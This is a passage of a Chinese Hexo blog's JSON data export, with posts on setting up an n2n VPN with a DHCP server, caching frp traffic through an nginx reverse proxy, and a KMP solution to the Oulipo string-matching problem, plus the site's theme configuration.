(最新版本支持v1、v2、v2s)</li>\n<li>网友编译的主程序：<a href=\"https://github.com/lucktu/n2n\">https://github.com/lucktu/n2n</a></li>\n</ul>\n<p>由于v2s版本直连概率比较高，所以本文只介绍v2s版本。同时服务端使用 ubuntu，客户端使用 windows。</p>\n<p><strong>安装方法</strong><br>先从服务端开始，在ubuntu上从github下载源码进行编译安装，由此获得两个可执行文件，supernode和edge。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/meyerd/n2n</span><br><span class=\"line\"><span class=\"built_in\">cd</span> n2n/n2n_v2</span><br><span class=\"line\">mkdir build</span><br><span class=\"line\"><span class=\"built_in\">cd</span> build</span><br><span class=\"line\">cmake ..</span><br><span class=\"line\">make</span><br><span class=\"line\">make install</span><br></pre></td></tr></table></figure><br>然后服务端运行supernode，服务端防火墙记得开放UDP监听端口，这里假设UDP监听端口为1234。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">supernode -l 1234</span><br></pre></td></tr></table></figure><br>接下来创建DHCP服务器。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install isc-dhcp-server</span><br><span class=\"line\">```bash</span><br><span class=\"line\"></span><br><span class=\"line\">配置 `/etc/dhcp/dhcpd.conf`，写入以下内容，也可以找到相应位置，取消注释，然后修改内容.</span><br><span class=\"line\">```bash</span><br><span class=\"line\">ddns-update-style interim;</span><br><span class=\"line\">ignore client-updates;</span><br><span class=\"line\">default-lease-time 604800;</span><br><span class=\"line\">max-lease-time 1209600;</span><br><span class=\"line\"></span><br><span class=\"line\">subnet 10.0.0.0 netmask 255.255.255.0 &#123;</span><br><span class=\"line\">    option subnet-mask 255.255.255.0;</span><br><span class=\"line\">    range dynamic-bootp 10.0.0.10 10.0.0.100;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>编辑<code>/etc/default/isc-dhcp-server</code>，添加一行。假设虚拟网卡名为tun0。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">INTERFACES=<span class=\"string\">&quot;tun0&quot;</span></span><br></pre></td></tr></table></figure><br>然后启动DHCP服务，可以使用<code>dhclient tun0</code>测试是否从DHCP服务器获取到IP。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service isc-dhcp-server start</span><br></pre></td></tr></table></figure><br>接下来配置服务端Edge节点，创建DHCP服务器用得着，否则也可以不用配置。<br>假设设定的n2n网络IP为10.0.0.1，如果需要可以加上<code>-k 自定义加密key值</code>。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">edge -d tun0 -a 10.0.0.1 -l 127.0.0.1:1234</span><br></pre></td></tr></table></figure><br>上面步骤会创建名为tun0的虚拟网卡，如果创建失败，可以按照下面方法手动创建。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install uml-utilities</span><br><span class=\"line\">tunctl -t tun0</span><br></pre></td></tr></table></figure><br>这样，其他Edge节点启动后就可以由10.0.0.1分配IP地址。<br>windows客户端直接下载编译好的EXE文件，或是自行从github仓库下载源码编译。<br>同时，windows需先安装tap-window虚拟网卡软件。<br>然后在命令行（管理员模式）运行，注意中文路径及特殊符号路径。<br>以下为DHCP获取IP地址的指令。（不知道为什么，我每次DHCP启动或关闭都会断网一瞬间）<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">edge -r -a dhcp:10.0.0.1 -l 服务端IP:1234</span><br></pre></td></tr></table></figure><br>以下为以指定IP（10.0.0.2）启动，各个Edge节点指定IP启动的IP需各不相同。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">edge -a 10.0.0.2 -l 服务端IP:1234</span><br></pre></td></tr></table></figure></p>"},{"title":"Nginx反向代理frp缓存加速","date":"2019-07-27T08:51:42.000Z","abbrlink":"37646cf8","_content":"使用nginx的反向代理缓存，将frp用户的http和https静态资源缓存到服务器本地，从而减少frp网络资源请求，直接加速静态资源访问。\n>新建缓存目录\n\n```bash\nmkdir -pv /home/nginx/cache\nchmod -R 777 /home/nginx/cache\n```\n>修改 nginx.conf\n\n在 http{} 里添加\n```nginx\nproxy_cache_path /home/nginx/cache levels=1:2 keys_zone=frp_cache:50m max_size=5g inactive=3d;\n```\n在 server{} 里添加\n```nginx\nlocation / {\n    proxy_pass http://127.0.0.1:8080;\n    proxy_redirect http://$host/ http://$http_host/;\n    proxy_set_header X-Real-IP $remote_addr;\n    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header Host $host;\n}\nlocation ~* \\.(jpg|jpeg|gif|png|svg|css|scss|js|ico|xml|woff|woff2|ttf|otf|eot)$ {\n    proxy_pass http://127.0.0.1:8080;\n    proxy_redirect http://$host/ http://$http_host/;\n    proxy_set_header X-Real-IP $remote_addr;\n    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header Host $host;\n    proxy_cache frp_cache;\n    proxy_cache_key $uri$is_args$args;\n    proxy_cache_valid 200 206 301 302 304 3d;\n    expires 3d;\n}\n```\n","source":"_posts/Nginx反向代理frp缓存加速.md","raw":"---\ntitle: Nginx反向代理frp缓存加速\ndate: 2019-07-27 16:51:42\ncategories:\n  - 计算机网络\ntags:\n  - nginx\n  - frp\nabbrlink: 37646cf8\n---\n使用nginx的反向代理缓存，将frp用户的http和https静态资源缓存到服务器本地，从而减少frp网络资源请求，直接加速静态资源访问。\n>新建缓存目录\n\n```bash\nmkdir -pv /home/nginx/cache\nchmod -R 777 /home/nginx/cache\n```\n>修改 nginx.conf\n\n在 http{} 里添加\n```nginx\nproxy_cache_path /home/nginx/cache levels=1:2 keys_zone=frp_cache:50m max_size=5g inactive=3d;\n```\n在 server{} 里添加\n```nginx\nlocation / {\n    proxy_pass http://127.0.0.1:8080;\n    proxy_redirect http://$host/ http://$http_host/;\n    proxy_set_header X-Real-IP $remote_addr;\n    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header Host $host;\n}\nlocation ~* \\.(jpg|jpeg|gif|png|svg|css|scss|js|ico|xml|woff|woff2|ttf|otf|eot)$ {\n    proxy_pass http://127.0.0.1:8080;\n    proxy_redirect http://$host/ http://$http_host/;\n    proxy_set_header X-Real-IP $remote_addr;\n    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header Host $host;\n    proxy_cache frp_cache;\n    proxy_cache_key $uri$is_args$args;\n    proxy_cache_valid 200 206 301 302 304 3d;\n    expires 3d;\n}\n```\n","slug":"Nginx反向代理frp缓存加速","published":1,"updated":"2020-05-11T09:39:27.674Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkb8001oqse52bgkf3os","content":"<p>使用nginx的反向代理缓存，将frp用户的http和https静态资源缓存到服务器本地，从而减少frp网络资源请求，直接加速静态资源访问。</p>\n<blockquote>\n<p>新建缓存目录</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir -pv /home/nginx/cache</span><br><span class=\"line\">chmod -R 777 /home/nginx/cache</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>修改 nginx.conf</p>\n</blockquote>\n<p>在 http{} 里添加<br><figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">proxy_cache_path</span> /home/nginx/cache levels=<span class=\"number\">1</span>:<span class=\"number\">2</span> keys_zone=frp_cache:<span class=\"number\">50m</span> max_size=<span class=\"number\">5g</span> inactive=<span class=\"number\">3d</span>;</span><br></pre></td></tr></table></figure><br>在 server{} 里添加<br><figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">location</span> / &#123;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_pass</span> http://127.0.0.1:8080;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_redirect</span> http://<span class=\"variable\">$host</span>/ http://<span class=\"variable\">$http_host</span>/;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> X-Real-IP <span class=\"variable\">$remote_addr</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> X-Forwarded-For <span class=\"variable\">$proxy_add_x_forwarded_for</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> Host <span class=\"variable\">$host</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"attribute\">location</span> <span class=\"regexp\">~* \\.(jpg|jpeg|gif|png|svg|css|scss|js|ico|xml|woff|woff2|ttf|otf|eot)$</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_pass</span> http://127.0.0.1:8080;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_redirect</span> http://<span class=\"variable\">$host</span>/ http://<span class=\"variable\">$http_host</span>/;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> X-Real-IP <span class=\"variable\">$remote_addr</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> X-Forwarded-For <span class=\"variable\">$proxy_add_x_forwarded_for</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> Host <span class=\"variable\">$host</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_cache</span> frp_cache;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_cache_key</span> <span class=\"variable\">$uri</span><span class=\"variable\">$is_args</span><span class=\"variable\">$args</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_cache_valid</span> <span class=\"number\">200</span> <span class=\"number\">206</span> <span class=\"number\">301</span> <span class=\"number\">302</span> <span class=\"number\">304</span> <span class=\"number\">3d</span>;</span><br><span class=\"line\">    <span class=\"attribute\">expires</span> <span class=\"number\">3d</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":891,"excerpt":"","more":"<p>使用nginx的反向代理缓存，将frp用户的http和https静态资源缓存到服务器本地，从而减少frp网络资源请求，直接加速静态资源访问。</p>\n<blockquote>\n<p>新建缓存目录</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir -pv /home/nginx/cache</span><br><span class=\"line\">chmod -R 777 /home/nginx/cache</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>修改 nginx.conf</p>\n</blockquote>\n<p>在 http{} 里添加<br><figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">proxy_cache_path</span> /home/nginx/cache levels=<span class=\"number\">1</span>:<span class=\"number\">2</span> keys_zone=frp_cache:<span class=\"number\">50m</span> max_size=<span class=\"number\">5g</span> inactive=<span class=\"number\">3d</span>;</span><br></pre></td></tr></table></figure><br>在 server{} 里添加<br><figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">location</span> / &#123;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_pass</span> http://127.0.0.1:8080;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_redirect</span> http://<span class=\"variable\">$host</span>/ http://<span class=\"variable\">$http_host</span>/;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> X-Real-IP <span class=\"variable\">$remote_addr</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> X-Forwarded-For <span class=\"variable\">$proxy_add_x_forwarded_for</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> Host <span class=\"variable\">$host</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"attribute\">location</span> <span class=\"regexp\">~* \\.(jpg|jpeg|gif|png|svg|css|scss|js|ico|xml|woff|woff2|ttf|otf|eot)$</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_pass</span> http://127.0.0.1:8080;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_redirect</span> http://<span class=\"variable\">$host</span>/ http://<span class=\"variable\">$http_host</span>/;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> X-Real-IP <span class=\"variable\">$remote_addr</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> X-Forwarded-For <span class=\"variable\">$proxy_add_x_forwarded_for</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_set_header</span> Host <span class=\"variable\">$host</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_cache</span> frp_cache;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_cache_key</span> <span class=\"variable\">$uri</span><span class=\"variable\">$is_args</span><span class=\"variable\">$args</span>;</span><br><span class=\"line\">    <span class=\"attribute\">proxy_cache_valid</span> <span class=\"number\">200</span> <span class=\"number\">206</span> <span class=\"number\">301</span> <span class=\"number\">302</span> <span class=\"number\">304</span> <span class=\"number\">3d</span>;</span><br><span class=\"line\">    <span class=\"attribute\">expires</span> <span class=\"number\">3d</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"Oulipo","date":"2019-03-29T09:11:09.000Z","abbrlink":"ba3acb8e","_content":"# Description\n{% blockquote %}\nThe French author Georges Perec (1936–1982) once wrote a book, La disparition, without the letter 'e'. He was a member of the Oulipo group. A quote from the book:\n\nTout avait Pair normal, mais tout s’affirmait faux. Tout avait Fair normal, d’abord, puis surgissait l’inhumain, l’affolant. Il aurait voulu savoir où s’articulait l’association qui l’unissait au roman : stir son tapis, assaillant à tout instant son imagination, l’intuition d’un tabou, la vision d’un mal obscur, d’un quoi vacant, d’un non-dit : la vision, l’avision d’un oubli commandant tout, où s’abolissait la raison : tout avait l’air normal mais…\n\nPerec would probably have scored high (or rather, low) in the following contest. People are asked to write a perhaps even meaningful text on some subject with as few occurrences of a given “word” as possible. Our task is to provide the jury with a program that counts these occurrences, in order to obtain a ranking of the competitors. These competitors often write very long texts with nonsense meaning; a sequence of 500,000 consecutive 'T's is not unusual. And they never use spaces.\n\nSo we want to quickly find out how often a word, i.e., a given string, occurs in a text. More formally: given the alphabet {'A', 'B', 'C', …, 'Z'} and two finite strings over that alphabet, a word W and a text T, count the number of occurrences of W in T. All the consecutive characters of W must exactly match consecutive characters of T. Occurrences may overlap.\n{% endblockquote %}\n<!--more-->\n# Input\n{% blockquote %}\nThe first line of the input file contains a single number: the number of test cases to follow. Each test case has the following format:\n\nOne line with the word W, a string over {'A', 'B', 'C', …, 'Z'}, with 1 ≤ |W| ≤ 10,000 (here |W| denotes the length of the string W).\nOne line with the text T, a string over {'A', 'B', 'C', …, 'Z'}, with |W| ≤ |T| ≤ 1,000,000.\n{% endblockquote %}\n# Output\n{% blockquote %}\nFor every test case in the input file, the output should contain a single number, on a single line: the number of occurrences of the word W in the text T.\n{% endblockquote %}\n# Sample Input\n```nohilight\n3\nBAPC\nBAPC\nAZA\nAZAZAZA\nVERDI\nAVERDXIVYERDIAN\n```\n# Sample Output\n```nohilight\n1\n3\n0\n```\n# Code\n```cpp\n#include<iostream>\n#include<string>\nusing namespace std;\nstring a,b;\nint NEXT[10020];\nvoid get()\n{\n    int i=0,j=-1;\n    NEXT[i]=j;\n    while(i<b.length()){\n        if(j==-1||b[i]==b[j]){\n            i++;j++;\n            NEXT[i]=j;\n        }\n        else j=NEXT[j];\n    }\n}\nint kmp()\n{\n    get();\n    int i=0,j=0,ans=0;\n    while(i<a.length())\n    {\n        if(j==-1||a[i]==b[j])\n        {\n            i++;j++;\n        }\n        else j=NEXT[j];\n        if(j==b.length())\n        {\n            ans++;\n            j=NEXT[j];\n        }\n    }\n    return ans;\n}\nint main()\n{\n    ios::sync_with_stdio(false);\n    int T;\n    cin>>T;\n    while(T--)\n    {\n        cin>>b>>a;\n        cout<<kmp()<<endl;\n    }\n    return 0;\n}\n```\n\n","source":"_posts/Oulipo.md","raw":"---\ntitle: Oulipo\ndate: 2019-03-29 17:11:09\ncategories:\n  - Algorithm\ntags:\n  - KMP\nabbrlink: ba3acb8e\n---\n# Description\n{% blockquote %}\nThe French author Georges Perec (1936–1982) once wrote a book, La disparition, without the letter 'e'. He was a member of the Oulipo group. A quote from the book:\n\nTout avait Pair normal, mais tout s’affirmait faux. Tout avait Fair normal, d’abord, puis surgissait l’inhumain, l’affolant. Il aurait voulu savoir où s’articulait l’association qui l’unissait au roman : stir son tapis, assaillant à tout instant son imagination, l’intuition d’un tabou, la vision d’un mal obscur, d’un quoi vacant, d’un non-dit : la vision, l’avision d’un oubli commandant tout, où s’abolissait la raison : tout avait l’air normal mais…\n\nPerec would probably have scored high (or rather, low) in the following contest. People are asked to write a perhaps even meaningful text on some subject with as few occurrences of a given “word” as possible. Our task is to provide the jury with a program that counts these occurrences, in order to obtain a ranking of the competitors. These competitors often write very long texts with nonsense meaning; a sequence of 500,000 consecutive 'T's is not unusual. And they never use spaces.\n\nSo we want to quickly find out how often a word, i.e., a given string, occurs in a text. More formally: given the alphabet {'A', 'B', 'C', …, 'Z'} and two finite strings over that alphabet, a word W and a text T, count the number of occurrences of W in T. All the consecutive characters of W must exactly match consecutive characters of T. Occurrences may overlap.\n{% endblockquote %}\n<!--more-->\n# Input\n{% blockquote %}\nThe first line of the input file contains a single number: the number of test cases to follow. Each test case has the following format:\n\nOne line with the word W, a string over {'A', 'B', 'C', …, 'Z'}, with 1 ≤ |W| ≤ 10,000 (here |W| denotes the length of the string W).\nOne line with the text T, a string over {'A', 'B', 'C', …, 'Z'}, with |W| ≤ |T| ≤ 1,000,000.\n{% endblockquote %}\n# Output\n{% blockquote %}\nFor every test case in the input file, the output should contain a single number, on a single line: the number of occurrences of the word W in the text T.\n{% endblockquote %}\n# Sample Input\n```nohilight\n3\nBAPC\nBAPC\nAZA\nAZAZAZA\nVERDI\nAVERDXIVYERDIAN\n```\n# Sample Output\n```nohilight\n1\n3\n0\n```\n# Code\n```cpp\n#include<iostream>\n#include<string>\nusing namespace std;\nstring a,b;\nint NEXT[10020];\nvoid get()\n{\n    int i=0,j=-1;\n    NEXT[i]=j;\n    while(i<b.length()){\n        if(j==-1||b[i]==b[j]){\n            i++;j++;\n            NEXT[i]=j;\n        }\n        else j=NEXT[j];\n    }\n}\nint kmp()\n{\n    get();\n    int i=0,j=0,ans=0;\n    while(i<a.length())\n    {\n        if(j==-1||a[i]==b[j])\n        {\n            i++;j++;\n        }\n        else j=NEXT[j];\n        if(j==b.length())\n        {\n            ans++;\n            j=NEXT[j];\n        }\n    }\n    return ans;\n}\nint main()\n{\n    ios::sync_with_stdio(false);\n    int T;\n    cin>>T;\n    while(T--)\n    {\n        cin>>b>>a;\n        cout<<kmp()<<endl;\n    }\n    return 0;\n}\n```\n\n","slug":"Oulipo","published":1,"updated":"2020-05-11T09:48:38.391Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkba001qqse5h6zph10q","content":"<h1 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h1><blockquote><p>The French author Georges Perec (1936–1982) once wrote a book, La disparition, without the letter ‘e’. He was a member of the Oulipo group. A quote from the book:</p>\n<p>Tout avait Pair normal, mais tout s’affirmait faux. Tout avait Fair normal, d’abord, puis surgissait l’inhumain, l’affolant. Il aurait voulu savoir où s’articulait l’association qui l’unissait au roman 